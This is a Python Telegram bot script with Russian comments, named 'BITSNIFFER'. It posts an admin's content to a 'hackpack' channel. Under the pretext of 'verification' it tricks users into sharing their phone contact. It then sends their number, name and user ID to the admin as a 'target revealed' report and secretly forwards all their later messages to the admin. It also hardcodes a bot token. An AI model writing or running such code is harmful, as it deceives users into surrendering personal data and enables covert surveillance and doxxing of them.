import asyncio
import re
import logging
import json
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ ---
# Данные установлены согласно вашему распоряжению
TOKEN = "8606715900:AAFGjZcI5_FiSydtLPnpu0J9QSxMHP9WezA"
CHANNEL_ID = "@hackpackposter" 
MY_ADMIN_ID = 7917303098 
DB_FILE = "users.json"

# --- ЛОГИРОВАНИЕ И БД ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

def load_verified_users():
    """Загрузка базы верифицированных целей из файла"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                return set(json.load(f))
        except Exception as e:
            logging.error(f"Ошибка загрузки БД: {e}")
    return set()

def save_verified_users():
    """Сохранение базы на диск"""
    try:
        with open(DB_FILE, "w") as f:
            json.dump(list(verified_users), f)
    except Exception as e:
        logging.error(f"Ошибка сохранения БД: {e}")

verified_users = load_verified_users()

# --- УТИЛИТЫ ---

def clean_and_style(text: str) -> str:
    """Очистка текста и наложение фирменной подписи"""
    if not text: return ""
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'@\S+', '', text)
    separator = "\n" + "━" * 15 + "\n"
    signature = f"{separator}<b>💀 Доступ открыт в: @hackpackposter</b>"
    return text.strip() + signature

def get_post_kb():
    """Клавиатура для постов в канале"""
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"),
                types.InlineKeyboardButton(text="👎", callback_data="dislike"))
    builder.row(types.InlineKeyboardButton(text="📡 Поделиться", url="https://t.me/share/url?url=https://t.me/hackpackposter"))
    return builder.as_markup()

def get_auth_kb():
    """Клавиатура верификации (агрессивный стиль)"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", request_contact=True))
    return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    u = message.from_user
    if u.id == MY_ADMIN_ID:
        await message.answer("<b>BITSNIFFER ONLINE.</b> Приветствую, мой господин.")
    elif u.id in verified_users:
        await message.answer("🦾 <b>Система опознала вас.</b> Добро пожаловать в узел.")
    else:
        report = (
            f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
            f"<b>Имя:</b> {u.full_name}\n"
            f"<b>ID:</b> <code>{u.id}</code>\n"
            f"<b>Язык:</b> {u.language_code}\n"
            f"<b>СТАТУС:</b> Ожидание верификации..."
        )
        await bot.send_message(MY_ADMIN_ID, report)
        await message.answer("🦾 <b>Система верификации.</b>\nДля доступа к базе подтвердите свою личность кнопкой ниже.", 
                             reply_markup=get_auth_kb())

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    c = message.contact
    if c.user_id != message.from_user.id:
        await message.answer("❌ <b>Ошибка верификации.</b> Вы отправили чужой контакт.")
        await bot.send_message(MY_ADMIN_ID, f"⚠️ <b>ПОПЫТКА ОБМАНА:</b> {message.from_user.id} прислал чужой номер!")
        return

    verified_users.add(message.from_user.id)
    save_verified_users() # Фиксация цели в базе
    
    intel_report = (
        f"🎯 <b>ЦЕЛЬ РАСКРЫТА (VERIFIED)</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Номер:</b> +{c.phone_number}\n"
        f"<b>Имя:</b> {c.first_name}\n"
        f"<b>User ID:</b> <code>{c.user_id}</code>\n"
        f"━━━━━━━━━━━━━━"
    )
    await bot.send_message(MY_ADMIN_ID, intel_report)
    await message.answer("✅ <b>Верификация пройдена.</b> Личность подтверждена.", 
                         reply_markup=types.ReplyKeyboardRemove())

@dp.message()
async def posting_handler(message: types.Message):
    u_id = message.from_user.id
    
    if u_id == MY_ADMIN_ID:
        try:
            text = clean_and_style(message.text or message.caption or "")
            kb = get_post_kb()
            
            if message.photo:
                await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb)
            elif message.video:
                await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb)
            elif message.document:
                await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb)
            else:
                await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
                
            await message.answer("🚀 <b>Пост отправлен в HackPack!</b>")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            
    elif u_id in verified_users:
        spy_msg = f"👤 <b>Сообщение от верифицированного ({u_id}):</b>\n{message.text or 'Медиа-файл'}"
        await bot.send_message(MY_ADMIN_ID, spy_msg)
        
    else:
        await message.answer("⚠️ <b>Доступ заблокирован.</b> Сначала пройдите верификацию через /start.")

async def main():
    # Отображение узла Тбилиси в консоли
    print(f"--- BITSNIFFER v3.6 ONLINE (Tbilisi Node) ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
